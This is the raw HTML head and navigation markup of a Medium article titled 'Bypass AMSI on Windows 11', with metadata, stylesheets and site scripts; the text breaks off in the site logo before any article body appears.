<html lang="en" data-rh="lang"><head><title>Bypass AMSI on Windows 11. Motivation | by Gustav Shen | Medium</title><meta data-rh="true" charset="utf-8"><meta data-rh="true" name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1,maximum-scale=1"><meta data-rh="true" name="theme-color" content="#000000"><meta data-rh="true" name="twitter:app:name:iphone" content="Medium"><meta data-rh="true" name="twitter:app:id:iphone" content="828256236"><meta data-rh="true" property="al:ios:app_name" content="Medium"><meta data-rh="true" property="al:ios:app_store_id" content="828256236"><meta data-rh="true" property="al:android:package" content="com.medium.reader"><meta data-rh="true" property="fb:app_id" content="542599432471018"><meta data-rh="true" property="og:site_name" content="Medium"><meta data-rh="true" property="og:type" content="article"><meta data-rh="true" property="article:published_time" content="2023-07-27T02:16:54.268Z"><meta data-rh="true" name="title" content="Bypass AMSI on Windows 11. Motivation | by Gustav Shen | Medium"><meta data-rh="true" property="og:title" content="Bypass AMSI on Windows 11"><meta data-rh="true" property="al:android:url" content="medium://p/75d231b2cac6"><meta data-rh="true" property="al:ios:url" content="medium://p/75d231b2cac6"><meta data-rh="true" property="al:android:app_name" content="Medium"><meta data-rh="true" name="description" content="In this article, I want to break down AMSI (Anti-Malware Scan Interface) and its bypass technique on Windows 11. AMSI bypass is not a new topic, and compared with bypassing EDR, AMSI bypass is much…"><meta data-rh="true" property="og:description" content="Motivation"><meta data-rh="true" property="og:url" content="https://gustavshen.medium.com/bypass-amsi-on-windows-11-75d231b2cac6"><meta data-rh="true" property="al:web:url" content="https://gustavshen.medium.com/bypass-amsi-on-windows-11-75d231b2cac6"><meta data-rh="true" property="og:image" content="https://miro.medium.com/v2/resize:fit:1200/0*5P_PNHqYmPYGuhMk.png"><meta data-rh="true" property="article:author" content="https://gustavshen.medium.com"><meta data-rh="true" name="author" content="Gustav Shen"><meta data-rh="true" name="robots" content="index,follow,max-image-preview:large"><meta data-rh="true" name="referrer" content="unsafe-url"><meta data-rh="true" property="twitter:title" content="Bypass AMSI on Windows 11"><meta data-rh="true" name="twitter:site" content="@Medium"><meta data-rh="true" name="twitter:app:url:iphone" content="medium://p/75d231b2cac6"><meta data-rh="true" property="twitter:description" content="Motivation"><meta data-rh="true" name="twitter:image:src" content="https://miro.medium.com/v2/resize:fit:1200/0*5P_PNHqYmPYGuhMk.png"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" name="twitter:label1" content="Reading time"><meta data-rh="true" name="twitter:data1" content="10 min read"><link data-rh="true" rel="icon" href="https://miro.medium.com/v2/1*m-R_BkNf1Qjr1YbyOIJY2w.png"><link data-rh="true" rel="search" type="application/opensearchdescription+xml" title="Medium" href="/osd.xml"><link data-rh="true" rel="apple-touch-icon" sizes="152x152" href="https://miro.medium.com/v2/resize:fill:152:152/1*sHhtYhaCe2Uc3IU0IgKwIQ.png"><link data-rh="true" rel="apple-touch-icon" sizes="120x120" href="https://miro.medium.com/v2/resize:fill:120:120/1*sHhtYhaCe2Uc3IU0IgKwIQ.png"><link data-rh="true" rel="apple-touch-icon" sizes="76x76" href="https://miro.medium.com/v2/resize:fill:76:76/1*sHhtYhaCe2Uc3IU0IgKwIQ.png"><link data-rh="true" rel="apple-touch-icon" sizes="60x60" href="https://miro.medium.com/v2/resize:fill:60:60/1*sHhtYhaCe2Uc3IU0IgKwIQ.png"><link data-rh="true" rel="mask-icon" href="https://cdn-static-1.medium.com/_/fp/icons/Medium-Avatar-500x500.svg" color="#171717"><link data-rh="true" rel="preconnect" href="https://glyph.medium.com" crossorigin=""><link data-rh="true" id="glyph_preload_link" rel="preload" as="style" type="text/css" href="https://glyph.medium.com/css/unbound.css"><link data-rh="true" id="glyph_link" rel="stylesheet" type="text/css" href="https://glyph.medium.com/css/unbound.css"><link data-rh="true" rel="author" href="https://gustavshen.medium.com"><link data-rh="true" rel="canonical" href="https://gustavshen.medium.com/bypass-amsi-on-windows-11-75d231b2cac6"><link data-rh="true" rel="alternate" href="android-app://com.medium.reader/https/medium.com/p/75d231b2cac6"><style type="text/css" data-fela-rehydration="524" data-fela-type="STATIC">html{box-sizing:border-box;-webkit-text-size-adjust:100%}*, *:before, *:after{box-sizing:inherit}body{margin:0;padding:0;text-rendering:optimizeLegibility;-webkit-font-smoothing:antialiased;color:rgba(0,0,0,0.8);position:relative;min-height:100vh}h1, h2, h3, h4, h5, h6, dl, dd, ol, ul, menu, figure, blockquote, p, pre, form{margin:0}menu, ol, ul{padding:0;list-style:none;list-style-image:none}main{display:block}a{color:inherit;text-decoration:none}a, button, input{-webkit-tap-highlight-color:transparent}img, svg{vertical-align:middle}button{background:transparent;overflow:visible}button, input, optgroup, select, textarea{margin:0}:root{--reach-tabs:1;--reach-menu-button:1}#speechify-root{font-family:Sohne, sans-serif}div[data-popper-reference-hidden="true"]{visibility:hidden;pointer-events:none}.grecaptcha-badge{visibility:hidden}
/*XCode style (c) Angel Garcia <angelgarcia.mail@gmail.com>*/.hljs {background: #fff;color: black;
}/* Gray DOCTYPE selectors like WebKit */
.xml .hljs-meta {color: #c0c0c0;
}.hljs-comment,
.hljs-quote {color: #007400;
}.hljs-tag,
.hljs-attribute,
.hljs-keyword,
.hljs-selector-tag,
.hljs-literal,
.hljs-name {color: #aa0d91;
}.hljs-variable,
.hljs-template-variable {color: #3F6E74;
}.hljs-code,
.hljs-string,
.hljs-meta .hljs-string {color: #c41a16;
}.hljs-regexp,
.hljs-link {color: #0E0EFF;
}.hljs-title,
.hljs-symbol,
.hljs-bullet,
.hljs-number {color: #1c00cf;
}.hljs-section,
.hljs-meta {color: #643820;
}.hljs-title.class_,
.hljs-class .hljs-title,
.hljs-type,
.hljs-built_in,
.hljs-params {color: #5c2699;
}.hljs-attr {color: #836C28;
}.hljs-subst {color: #000;
}.hljs-formula {background-color: #eee;font-style: italic;
}.hljs-addition {background-color: #baeeba;
}.hljs-deletion {background-color: #ffc8bd;
}.hljs-selector-id,
.hljs-selector-class {color: #9b703f;
}.hljs-doctag,
.hljs-strong {font-weight: bold;
}.hljs-emphasis {font-style: italic;
}
</style><style type="text/css" data-fela-rehydration="524" data-fela-type="KEYFRAME">@-webkit-keyframes k1{0%{opacity:0.8}50%{opacity:0.5}100%{opacity:0.8}}@-moz-keyframes k1{0%{opacity:0.8}50%{opacity:0.5}100%{opacity:0.8}}@keyframes k1{0%{opacity:0.8}50%{opacity:0.5}100%{opacity:0.8}}@-webkit-keyframes k1{0%{transform:translate(-50%, -100px)}100%{transform:translate(-50%, 0)}}@-moz-keyframes k1{0%{transform:translate(-50%, -100px)}100%{transform:translate(-50%, 0)}}@keyframes k1{0%{transform:translate(-50%, -100px)}100%{transform:translate(-50%, 0)}}</style><style type="text/css" data-fela-rehydration="524" data-fela-type="RULE">.a{font-family:medium-content-sans-serif-font, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif}.b{font-weight:400}.c{background-color:rgba(255, 255, 255, 1)}.l{display:block}.m{position:sticky}.n{top:0}.o{z-index:500}.p{padding:0 24px}.q{align-items:center}.r{border-bottom:solid 1px #F2F2F2}.y{height:41px}.z{line-height:20px}.ab{display:flex}.ac{height:57px}.ae{flex:1 0 auto}.af{color:inherit}.ag{fill:inherit}.ah{font-size:inherit}.ai{border:inherit}.aj{font-family:inherit}.ak{letter-spacing:inherit}.al{font-weight:inherit}.am{padding:0}.an{margin:0}.ao{cursor:pointer}.ap:disabled{cursor:not-allowed}.aq:disabled{color:#6B6B6B}.ar:disabled{fill:#6B6B6B}.au{margin-left:16px}.av{border:none}.aw{border-radius:20px}.ax{width:240px}.ay{background:#F9F9F9}.az path{fill:#6B6B6B}.bb{outline:none}.bc{font-family:sohne, "Helvetica Neue", Helvetica, Arial, sans-serif}.bd{font-size:14px}.be{width:100%}.bf{padding:10px 20px 10px 0}.bg{background-color:transparent}.bh{color:#242424}.bi::placeholder{color:#6B6B6B}.bj{display:inline-block}.bk{margin-left:12px}.bl{margin-right:12px}.bm{border-radius:4px}.bn{margin-left:24px}.bo{height:24px}.bu{background-color:#F9F9F9}.bv{border-radius:50%}.bw{height:32px}.bx{width:32px}.by{justify-content:center}.ce{max-width:680px}.cf{min-width:0}.cg{animation:k1 1.2s ease-in-out infinite}.ch{height:100vh}.ci{margin-bottom:16px}.cj{margin-top:48px}.ck{align-items:flex-start}.cl{flex-direction:column}.cm{justify-content:space-between}.cn{margin-bottom:24px}.ct{width:80%}.cu{background-color:#F2F2F2}.da{height:44px}.db{width:44px}.dc{margin:auto 0}.dd{margin-bottom:4px}.de{height:16px}.df{width:120px}.dg{width:80px}.dm{margin-bottom:8px}.dn{width:96%}.do{width:98%}.dp{width:81%}.dq{margin-left:8px}.dr{color:#6B6B6B}.ds{font-size:13px}.dt{height:100%}.el{color:#FFFFFF}.em{fill:#FFFFFF}.eo{background:#1A8917}.ep{border-color:#1A8917}.et:disabled{cursor:inherit !important}.eu:disabled{opacity:0.3}.ev:disabled:hover{background:#1A8917}.ew:disabled:hover{border-color:#1A8917}.ex{border-radius:99em}.ey{border-width:1px}.ez{border-style:solid}.fa{box-sizing:border-box}.fb{text-decoration:none}.fc{text-align:center}.ff{margin-right:32px}.fg{position:relative}.fh{fill:#6B6B6B}.fk{background:transparent}.fl svg{margin-left:4px}.fm svg{fill:#6B6B6B}.fo{box-shadow:inset 0 0 0 1px rgba(0, 0, 0, 0.05)}.fp{position:absolute}.fw{margin:0 24px}.ga{background:rgba(255, 255, 255, 1)}.gb{border:1px solid #F2F2F2}.gc{box-shadow:0 1px 4px #F2F2F2}.gd{max-height:100vh}.ge{overflow-y:auto}.gf{left:0}.gg{top:calc(100vh + 100px)}.gh{bottom:calc(100vh + 100px)}.gi{width:10px}.gj{pointer-events:none}.gk{word-break:break-word}.gl{word-wrap:break-word}.gm:after{display:block}.gn:after{content:""}.go:after{clear:both}.gp{line-height:1.23}.gq{letter-spacing:0}.gr{font-style:normal}.gs{font-weight:700}.hs{@media all and (max-width: 551.98px):8px}.ht{@media all and (min-width: 552px) and (max-width: 727.98px):8px}.hu{@media all and (min-width: 728px) and (max-width: 903.98px):16px}.hv{@media all and (min-width: 904px) and (max-width: 1079.98px):16px}.hw{@media all and (min-width: 1080px):16px}.ic{align-items:baseline}.id{width:48px}.ie{height:48px}.if{border:2px solid rgba(255, 255, 255, 1)}.ig{z-index:0}.ih{box-shadow:none}.ii{border:1px solid rgba(0, 0, 0, 0.05)}.ij{margin-bottom:2px}.ik{flex-wrap:nowrap}.il{font-size:16px}.im{line-height:24px}.io{margin:0 8px}.ip{display:inline}.iq{color:#1A8917}.ir{fill:#1A8917}.iu{flex:0 0 auto}.ix{flex-wrap:wrap}.iy{padding-left:8px}.iz{padding-right:8px}.ka> *{flex-shrink:0}.kb{overflow-x:scroll}.kc::-webkit-scrollbar{display:none}.kd{scrollbar-width:none}.ke{-ms-overflow-style:none}.kf{width:74px}.kg{flex-direction:row}.kh{z-index:2}.ki{margin-right:4px}.kl{-webkit-user-select:none}.km{border:0}.kn{fill:rgba(117, 117, 117, 1)}.kq{outline:0}.kr{user-select:none}.ks> svg{pointer-events:none}.lb{cursor:progress}.lc{opacity:1}.ld{padding:4px 0}.lg{margin-top:0px}.lh{width:16px}.lj{display:inline-flex}.lp{max-width:100%}.lq{padding:8px 2px}.lr svg{color:#6B6B6B}.mi{line-height:1.12}.mj{letter-spacing:-0.022em}.mk{font-weight:600}.nf{margin-bottom:-0.28em}.ng{line-height:1.58}.nh{letter-spacing:-0.004em}.ni{font-family:source-serif-pro, Georgia, Cambria, "Times New Roman", Times, serif}.od{margin-bottom:-0.46em}.oe{margin-left:auto}.of{margin-right:auto}.og{max-width:1457px}.om{clear:both}.oo{cursor:zoom-in}.op{z-index:auto}.or{height:auto}.ox{max-width:727px}.oy{max-width:709px}.oz{max-width:660px}.pa{max-width:1259px}.pb{max-width:685px}.pc{max-width:696px}.pd{max-width:1106px}.pe{max-width:1092px}.pf{max-width:1255px}.pg{max-width:1082px}.ph{overflow-x:auto}.pi{font-family:source-code-pro, Menlo, Monaco, "Courier New", Courier, monospace}.pj{padding:32px}.pk{border:1px solid #E5E5E5}.pl{line-height:1.4}.pm{margin-top:-0.2em}.pn{margin-bottom:-0.2em}.po{white-space:pre}.pp{min-width:fit-content}.pq{max-width:914px}.pr{max-width:928px}.ps{max-width:1099px}.pt{max-width:1463px}.pu{max-width:931px}.pv{max-width:1423px}.pw{max-width:1466px}.px{max-width:1487px}.py{max-width:840px}.pz{max-width:1237px}.qa{max-width:491px}.qb{max-width:1253px}.qc{max-width:1438px}.qd{max-width:516px}.qe{max-width:523px}.qf{max-width:916px}.qg{max-width:1421px}.qh{max-width:1456px}.qi{max-width:1460px}.qj{max-width:1424px}.qk{max-width:756px}.ql{max-width:1241px}.qm{max-width:1545px}.qn{max-width:1189px}.qo{text-decoration:underline}.qp{margin-bottom:26px}.qq{margin-top:6px}.qr{margin-top:8px}.qs{margin-right:8px}.qt{padding:8px 16px}.qu{border-radius:100px}.qv{transition:background 300ms ease}.qx{white-space:nowrap}.qy{border-top:none}.re{height:52px}.rf{max-height:52px}.rg{box-sizing:content-box}.rh{position:static}.ri{z-index:1}.rk{max-width:155px}.rq{margin-right:20px}.rw{align-items:flex-end}.rx{width:76px}.ry{height:76px}.rz{border:2px solid #F9F9F9}.sa{height:72px}.sb{width:72px}.sc{width:auto}.sd{stroke:#F2F2F2}.se{height:36px}.sf{width:36px}.sg{color:#F2F2F2}.sh{fill:#F2F2F2}.si{background:#F2F2F2}.sj{border-color:#F2F2F2}.sp{font-weight:500}.sq{font-size:24px}.sr{line-height:30px}.ss{letter-spacing:-0.016em}.st{margin-top:16px}.su{height:0px}.sv{border-bottom:solid 1px #E5E5E5}.tb{margin-top:72px}.tc{padding:24px 0}.td{margin-bottom:0px}.te{margin-right:16px}.as:hover:not(:disabled){color:rgba(25, 25, 25, 1)}.at:hover:not(:disabled){fill:rgba(25, 25, 25, 1)}.eq:hover{background:#156D12}.er:hover{border-color:#156D12}.es:hover{cursor:pointer}.fi:hover{color:#242424}.fj:hover{fill:#242424}.fn:hover svg{fill:#242424}.fq:hover{background-color:rgba(0, 0, 0, 0.1)}.in:hover{text-decoration:underline}.is:hover:not(:disabled){color:#156D12}.it:hover:not(:disabled){fill:#156D12}.kp:hover{fill:rgba(8, 8, 8, 1)}.le:hover{fill:#000000}.lf:hover p{color:#000000}.li:hover{color:#000000}.ls:hover svg{color:#000000}.qw:hover{background-color:#F2F2F2}.sk:hover{background:#F2F2F2}.sl:hover{border-color:#F2F2F2}.sm:hover{cursor:wait}.sn:hover{color:#F2F2F2}.so:hover{fill:#F2F2F2}.ba:focus-within path{fill:#242424}.ko:focus{fill:rgba(8, 8, 8, 1)}.lt:focus svg{color:#000000}.oq:focus{transform:scale(1.01)}.kt:active{border-style:none}</style><style type="text/css" data-fela-rehydration="524" data-fela-type="RULE" media="all and (min-width: 1080px)">.d{display:none}.bt{width:64px}.cd{margin:0 64px}.cs{height:48px}.cz{margin-bottom:52px}.dl{margin-bottom:48px}.ec{font-size:14px}.ed{line-height:20px}.ej{font-size:13px}.ek{padding:5px 12px}.fe{display:flex}.fv{margin-bottom:68px}.fz{max-width:680px}.hn{font-size:42px}.ho{margin-top:1.19em}.hp{margin-bottom:32px}.hq{line-height:52px}.hr{letter-spacing:-0.011em}.ib{align-items:center}.jm{border-top:solid 1px #F2F2F2}.jn{border-bottom:solid 1px #F2F2F2}.jo{margin:32px 0 0}.jp{padding:3px 8px}.jy> *{margin-right:24px}.jz> :last-child{margin-right:0}.la{margin-top:0px}.lo{margin:0}.nb{font-size:24px}.nc{margin-top:1.95em}.nd{line-height:30px}.ne{letter-spacing:-0.016em}.nz{font-size:20px}.oa{margin-top:0.94em}.ob{line-height:32px}.oc{letter-spacing:-0.003em}.ol{margin-top:56px}.ow{margin-top:2.14em}.rd{margin-bottom:88px}.rp{display:inline-block}.rv{padding-top:72px}.ta{margin-top:40px}</style><style type="text/css" data-fela-rehydration="524" data-fela-type="RULE" media="all and (max-width: 1079.98px)">.e{display:none}.kz{margin-top:0px}.ro{display:inline-block}</style><style type="text/css" data-fela-rehydration="524" data-fela-type="RULE" media="all and (max-width: 903.98px)">.f{display:none}.ky{margin-top:0px}.rn{display:inline-block}</style><style type="text/css" data-fela-rehydration="524" data-fela-type="RULE" media="all and (max-width: 727.98px)">.g{display:none}.kw{margin-top:0px}.kx{margin-right:0px}.rm{display:inline-block}</style><style type="text/css" data-fela-rehydration="524" data-fela-type="RULE" media="all and (max-width: 551.98px)">.h{display:none}.s{display:flex}.t{justify-content:space-between}.bp{width:24px}.bz{margin:0 24px}.co{height:40px}.cv{margin-bottom:44px}.dh{margin-bottom:32px}.du{font-size:13px}.dv{line-height:20px}.ee{padding:0px 8px 1px}.fr{margin-bottom:4px}.gt{font-size:32px}.gu{margin-top:1.01em}.gv{margin-bottom:24px}.gw{line-height:38px}.gx{letter-spacing:-0.014em}.hx{align-items:flex-start}.iv{flex-direction:column}.ja{margin:24px -24px 0}.jb{padding:0}.jq> *{margin-right:8px}.jr> :last-child{margin-right:24px}.kj{margin-left:0px}.ku{margin-top:0px}.kv{margin-right:0px}.lk{margin:0}.lu{border:1px solid #F2F2F2}.lv{border-radius:99em}.lw{padding:0px 16px 0px 12px}.lx{height:38px}.ly{align-items:center}.ma svg{margin-right:8px}.ml{font-size:20px}.mm{margin-top:1.2em}.mn{line-height:24px}.mo{letter-spacing:0}.nj{font-size:18px}.nk{margin-top:0.67em}.nl{line-height:28px}.nm{letter-spacing:-0.003em}.oh{margin-top:40px}.os{margin-top:1.56em}.qz{margin-bottom:80px}.rl{display:inline-block}.rr{padding-top:48px}.sw{margin-top:32px}.lz:hover{border-color:#E5E5E5}</style><style type="text/css" data-fela-rehydration="524" data-fela-type="RULE" media="all and (min-width: 904px) and (max-width: 1079.98px)">.i{display:none}.bs{width:64px}.cc{margin:0 64px}.cr{height:48px}.cy{margin-bottom:52px}.dk{margin-bottom:48px}.ea{font-size:14px}.eb{line-height:20px}.eh{font-size:13px}.ei{padding:5px 12px}.fd{display:flex}.fu{margin-bottom:68px}.fy{max-width:680px}.hi{font-size:42px}.hj{margin-top:1.19em}.hk{margin-bottom:32px}.hl{line-height:52px}.hm{letter-spacing:-0.011em}.ia{align-items:center}.ji{border-top:solid 1px #F2F2F2}.jj{border-bottom:solid 1px #F2F2F2}.jk{margin:32px 0 0}.jl{padding:3px 8px}.jw> *{margin-right:24px}.jx> :last-child{margin-right:0}.ln{margin:0}.mx{font-size:24px}.my{margin-top:1.95em}.mz{line-height:30px}.na{letter-spacing:-0.016em}.nv{font-size:20px}.nw{margin-top:0.94em}.nx{line-height:32px}.ny{letter-spacing:-0.003em}.ok{margin-top:56px}.ov{margin-top:2.14em}.rc{margin-bottom:88px}.ru{padding-top:72px}.sz{margin-top:40px}</style><style type="text/css" data-fela-rehydration="524" data-fela-type="RULE" media="all and (min-width: 728px) and (max-width: 903.98px)">.j{display:none}.w{display:flex}.x{justify-content:space-between}.br{width:64px}.cb{margin:0 48px}.cq{height:48px}.cx{margin-bottom:52px}.dj{margin-bottom:48px}.dy{font-size:13px}.dz{line-height:20px}.eg{padding:0px 8px 1px}.ft{margin-bottom:68px}.fx{max-width:680px}.hd{font-size:42px}.he{margin-top:1.19em}.hf{margin-bottom:32px}.hg{line-height:52px}.hh{letter-spacing:-0.011em}.hz{align-items:center}.je{border-top:solid 1px #F2F2F2}.jf{border-bottom:solid 1px #F2F2F2}.jg{margin:32px 0 0}.jh{padding:3px 8px}.ju> *{margin-right:24px}.jv> :last-child{margin-right:0}.lm{margin:0}.mt{font-size:24px}.mu{margin-top:1.95em}.mv{line-height:30px}.mw{letter-spacing:-0.016em}.nr{font-size:20px}.ns{margin-top:0.94em}.nt{line-height:32px}.nu{letter-spacing:-0.003em}.oj{margin-top:56px}.ou{margin-top:2.14em}.rb{margin-bottom:88px}.rt{padding-top:72px}.sy{margin-top:40px}</style><style type="text/css" data-fela-rehydration="524" data-fela-type="RULE" media="all and (min-width: 552px) and (max-width: 727.98px)">.k{display:none}.u{display:flex}.v{justify-content:space-between}.bq{width:24px}.ca{margin:0 24px}.cp{height:40px}.cw{margin-bottom:44px}.di{margin-bottom:32px}.dw{font-size:13px}.dx{line-height:20px}.ef{padding:0px 8px 1px}.fs{margin-bottom:4px}.gy{font-size:32px}.gz{margin-top:1.01em}.ha{margin-bottom:24px}.hb{line-height:38px}.hc{letter-spacing:-0.014em}.hy{align-items:flex-start}.iw{flex-direction:column}.jc{margin:24px 0 0}.jd{padding:0}.js> *{margin-right:8px}.jt> :last-child{margin-right:8px}.kk{margin-left:0px}.ll{margin:0}.mb{border:1px solid #F2F2F2}.mc{border-radius:99em}.md{padding:0px 16px 0px 12px}.me{height:38px}.mf{align-items:center}.mh svg{margin-right:8px}.mp{font-size:20px}.mq{margin-top:1.2em}.mr{line-height:24px}.ms{letter-spacing:0}.nn{font-size:18px}.no{margin-top:0.67em}.np{line-height:28px}.nq{letter-spacing:-0.003em}.oi{margin-top:40px}.ot{margin-top:1.56em}.ra{margin-bottom:80px}.rs{padding-top:48px}.sx{margin-top:32px}.mg:hover{border-color:#E5E5E5}</style><style type="text/css" data-fela-rehydration="524" data-fela-type="RULE" media="print">.rj{display:none}</style><style type="text/css" data-fela-rehydration="524" data-fela-type="RULE" media="(prefers-reduced-motion: no-preference)">.on{transition:transform 300ms cubic-bezier(0.2, 0, 0.2, 1)}</style><script type="text/javascript" async="" src="https://www.gstatic.com/recaptcha/releases/TqxSU0dsOd2Q9IbI7CpFnJLD/recaptcha__pl.js" crossorigin="anonymous" integrity="sha384-EtuwsrUt4o3rjKbOIgbMlrdETicyC7YJiOMF4S2kRPR2c6EcUDPrB1OFkiSEO3IC"></script><script async="" src="https://cdn.branch.io/branch-latest.min.js"></script><script type="application/ld+json" data-rh="true">{"@context":"http:\u002F\u002Fschema.org","@type":"NewsArticle","image":["https:\u002F\u002Fmiro.medium.com\u002Fv2\u002Fresize:fit:1200\u002F0*5P_PNHqYmPYGuhMk.png"],"url":"https:\u002F\u002Fgustavshen.medium.com\u002Fbypass-amsi-on-windows-11-75d231b2cac6","dateCreated":"2023-07-27T02:16:54.268Z","datePublished":"2023-07-27T02:16:54.268Z","dateModified":"2023-07-28T23:35:05.640Z","headline":"Bypass AMSI on Windows 11 - Gustav Shen - Medium","name":"Bypass AMSI on Windows 11 - Gustav Shen - Medium","description":"In this article, I want to break down AMSI (Anti-Malware Scan Interface) and its bypass technique on Windows 11. AMSI bypass is not a new topic, and compared with bypassing EDR, AMSI bypass is much…","identifier":"75d231b2cac6","author":{"@type":"Person","name":"Gustav Shen","url":"https:\u002F\u002Fgustavshen.medium.com"},"creator":["Gustav Shen"],"publisher":{"@type":"Organization","name":"Medium","url":"https:\u002F\u002Fgustavshen.medium.com\u002F","logo":{"@type":"ImageObject","width":308,"height":60,"url":"https:\u002F\u002Fmiro.medium.com\u002Fv2\u002Fresize:fit:385\u002F1*OMF3fSqH8t4xBJ9-6oZDZw.png"}},"mainEntityOfPage":"https:\u002F\u002Fgustavshen.medium.com\u002Fbypass-amsi-on-windows-11-75d231b2cac6"}</script><style data-fela-type="RULE" type="text/css" media="(orientation: landscape) and (max-width: 903.98px)"></style><script async="true" src="https://www.googletagmanager.com/gtag/js?id=G-7JY7T788PK" data-rh="true"></script><script data-rh="true">window.dataLayer = window.dataLayer || [];
            function gtag(){dataLayer.push(arguments);}
            gtag('js', new Date());

            gtag('config', 'G-7JY7T788PK');</script><script type="text/javascript" data-rh="true">(function(b,r,a,n,c,h,_,s,d,k){if(!b[n]||!b[n]._q){for(;s<_.length;)c(h,_[s++]);d=r.createElement(a);d.async=1;d.src="https://cdn.branch.io/branch-latest.min.js";k=r.getElementsByTagName(a)[0];k.parentNode.insertBefore(d,k);b[n]=h}})(window,document,"script","branch",function(b,r){b[r]=function(){b._q.push([r,arguments])}},{_q:[],_v:1},"addListener applyCode autoAppIndex banner closeBanner closeJourney creditHistory credits data deepview deepviewCta first getCode init link logout redeem referrals removeListener sendSMS setBranchViewData setIdentity track validateCode trackCommerceEvent logEvent".split(" "), 0);
branch.init('key_live_ofxXr2qTrrU9NqURK8ZwEhknBxiI6KBm', {metadata: {}, 'no_journeys': true, 'disable_exit_animation': true, 'disable_entry_animation': true, 'tracking_disabled': null}, function(err, data) {});</script><script src="https://www.google.com/recaptcha/enterprise.js?render=6Le-uGgpAAAAAPprRaokM8AKthQ9KNGdoxaGUvVp" data-rh="true"></script><script type="text/javascript" async="" src="https://app.link/_r?sdk=web2.85.0&amp;branch_key=key_live_ofxXr2qTrrU9NqURK8ZwEhknBxiI6KBm&amp;callback=branch_callback__0"></script></head><body><div id="root"><div class="a b c"><div class="d e f g h i j k"></div><script>document.domain = document.domain;</script><div><script>if (window.self !== window.top) window.location = "about:blank"</script></div><div class="l c"><div class="l m n o c" style="transform: translateY(0px);"><div class="p q r s t u v w x i d y z"><a class="dr ag ds bc ak b am an ao ap aq ar as at s u w i d q dt z" href="https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F75d231b2cac6&amp;%7Efeature=LoOpenInAppButton&amp;%7Echannel=ShowPostUnderUser&amp;source=---two_column_layout_nav----------------------------------" rel="noopener follow">Open in app<svg width="10" height="10" viewBox="0 0 10 10" fill="none" class="dq"><path d="M.98 8.48a.37.37 0 1 0 .54.54l-.54-.54zm7.77-7.23h.38c0-.2-.17-.38-.38-.38v.38zM8.37 6.5a.37.37 0 1 0 .76 0h-.76zM3.5.87a.37.37 0 1 0 0 .76V.88zM1.52 9.03l7.5-7.5-.54-.54-7.5 7.5.54.54zm6.86-7.77V6.5h.74V1.25h-.74zm-4.88.38h5.25V.88H3.5v.74z" fill="currentColor"></path></svg></a><div class="ab q"><p class="bc b du dv dw dx dy dz ea eb ec ed dr"><span><button class="bc b du dv ee dw dx ef dy dz eg eh eb ei ej ed ek el em eo ep eq er es et eu ev ew ex ey ez fa bj fb fc" data-testid="headerSignUpButton">Sign up</button></span></p><div class="au l"><p class="bc b du dv dw dx dy dz ea eb ec ed dr"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerSignInButton" href="https://medium.com/m/signin?operation=login&amp;redirect=https%3A%2F%2Fgustavshen.medium.com%2Fbypass-amsi-on-windows-11-75d231b2cac6&amp;source=post_page---two_column_layout_nav-----------------------global_nav-----------" rel="noopener follow">Sign in</a></span></p></div></div></div><div class="p q r ab ac"><div class="ab q ae"><a class="af ag ah ai aj ak al am an ao ap aq ar as at ab" aria-label="Homepage" data-testid="headerMediumLogo" href="https://medium.com/?source=---two_column_layout_nav----------------------------------" rel="noopener follow"><svg width="120" height="27" viewBox="0 0 120 27" fill="none"><mask id="logo-wordmark-pride_svg__a" style="mask-type:alpha" maskUnits="userSpaceOnUse" x="1" y="0" width="119" height="27"><path d="M29.69 2.36h.03v-.29h-7.26L15.7 18.05 8.96 2.07H1.12v.28l.04.01c1.32.3 2 .75 2 2.37v19c0 1.62-.68 2.07-2 2.37h-.04v.29h5.31v-.28H6.4c-1.33-.3-2-.76-2-2.38V5.83l8.67 20.56h.5l8.91-21.13V24.2c-.1 1.28-.78 1.67-1.98 1.95h-.03v.28h9.25v-.27l-.03-.01c-1.2-.28-1.89-.67-2-1.95V4.73c0-1.62.67-2.07 2-2.37zm4.23 12.58c.15-3.41 1.37-5.87 3.4-5.92.64.01 1.17.22 1.58.62.87.86 1.28 2.64 1.22 5.3h-6.2zm-.1.96h10.86v-.04c-.03-2.61-.78-4.64-2.23-6.03a7.3 7.3 0 0 0-5.05-1.87h-.04a7.31 7.31 0 0 0-5.75 2.78 10.4 10.4 0 0 0-2.08 5.72l-.02.2a7.61 7.61 0 0 0-.02.56v.58c.11 5.09 2.84 9.16 7.69 9.16 4.25 0 6.73-3.14 7.35-7.34l-.32-.11c-1.08 2.26-3.03 3.63-5.25 3.46-3.03-.23-5.35-3.32-5.13-7.06m23.12 6.89c-.36.85-1.1 1.32-2.1 1.32s-1.9-.7-2.55-1.94a12.23 12.23 0 0 1-1.06-5.49c0-4.68 1.45-7.7 3.68-7.7.94 0 1.68.47 2.03 1.28V22.8zm7.2 3.33c-1.33-.31-2-.78-2-2.49V.96l-8.07 2.39v.3l.05-.01c1.11-.1 1.87.06 2.3.47.35.32.52.8.52 1.5v3.1a5.18 5.18 0 0 0-2.89-.75c-2.33 0-4.45.98-5.99 2.78-1.6 1.86-2.44 4.42-2.44 7.38 0 5.28 2.58 8.84 6.43 8.84a5.09 5.09 0 0 0 4.89-3.34v2.81h7.23v-.29h-.03zm6.9-22.09c0-1.65-1.23-2.9-2.87-2.9a2.87 2.87 0 0 0-2.9 2.9c0 1.63 1.27 2.9 2.9 2.9a2.82 2.82 0 0 0 2.88-2.9zm1.91 22.1c-1.32-.32-2-.8-2-2.5V8.01l-7.24 2.1v.28h.05c1.56.14 1.99.68 1.99 2.53v13.51H73v-.29h-.04zm18.54 0c-1.33-.32-2-.8-2-2.5V8.01l-6.89 2.02v.29h.04c1.28.14 1.65.71 1.65 2.56v9.88a2.48 2.48 0 0 1-2.2 1.4c-1.57 0-2.43-1.08-2.43-3.02V8.01l-7.24 2.1v.28h.04c1.57.14 2 .68 2 2.53v8.36c0 .58.05 1.16.15 1.74l.13.57c.61 2.21 2.22 3.37 4.73 3.37 2.13 0 4-1.33 4.82-3.4v2.88h7.23v-.3h-.03zm28.1.3v-.3h-.03c-1.44-.34-2-.97-2-2.26V13.25c0-3.31-1.85-5.3-4.95-5.3a5.08 5.08 0 0 0-4.9 3.37c-.58-2.17-2.25-3.36-4.73-3.36a4.7 4.7 0 0 